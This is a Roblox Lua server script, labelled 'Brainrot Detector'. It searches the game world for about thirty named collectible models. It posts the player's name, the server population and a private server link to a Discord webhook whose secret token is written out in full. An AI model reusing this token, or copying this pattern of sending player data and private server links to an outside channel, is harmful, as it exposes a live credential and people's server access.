-- Server-side Webhook Script
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- RemoteEvent existente
local sendEvent = ReplicatedStorage:WaitForChild("SendDiscordWebhook")

-- Webhook URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1427117977899237406/S4r8I4aIhw9l4TJeBKy6AFIJeCFZOh8gfQ0wqoa8QFv9o7nL1FnO9--4t9CQm-aCIWbL"

-- Lista completa de objetos a monitorear (todo en lowercase)
local objectNames = {
    "la grande combinasion", "ketchuru and musturu", "ketupat kepat", "burguro and fryuro", "la supreme combinasion",
    "tacorita bicicleta", "los tacoritas", "garama and madundung", "dragon cannelloni", "esok sekolah",
    "tang tang keletang", "strawberry elephant", "la secret combinasion", "tralaledon", "eviledon",
    "spaghetti tualetti", "los hotspotsitos", "los mobilis", "los 67", "money money puggy",
    "celularcini viciosini", "los bros", "las sis", "los primos", "la spooky grande",
    "spooky and pumpky", "chillin chili", "tictac sahur", "la extinct grande", "nuclearo dinossauro"
}

-- Función para buscar todos los objetos
local function findObjects()
    local found = {}
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("BasePart") or obj:IsA("Model") then
            local objName = string.lower(obj.Name)
            for _, name in ipairs(objectNames) do
                if objName == name and not table.find(found, obj.Name) then
                    table.insert(found, obj.Name)
                end
            end
        end
    end
    return found
end

-- Función para enviar webhook
local function sendWebhook(player, privateServerLink)
    local objectsFound = findObjects()
    local descriptionText
    if #objectsFound == 0 then
        descriptionText = "No monitored objects were found in the base."
    else
        descriptionText = "Objects found: " .. table.concat(objectsFound, ", ")
    end

    local data = {
        ["username"] = "Brainrot Detector",
        ["content"] = "@everyone",
        ["embeds"] = {{
            ["title"] = "Brainrot Detection Report",
            ["description"] = descriptionText,
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "Player",
                    ["value"] = player.Name
                },
                {
                    ["name"] = "Players in Server",
                    ["value"] = tostring(#Players:GetPlayers())
                },
                {
                    ["name"] = "Private Server Link",
                    ["value"] = privateServerLink or "N/A"
                }
            },
            ["footer"] = {
                ["text"] = "PlaceId: " .. tostring(game.PlaceId)
            }
        }}
    }

    local success, err = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("✅ Webhook sent successfully for player:", player.Name)
    else
        warn("❌ Failed to send webhook:", err)
    end
end

-- Conectar al RemoteEvent
sendEvent.OnServerEvent:Connect(function(player, privateServerLink)
    sendWebhook(player, privateServerLink)
end)
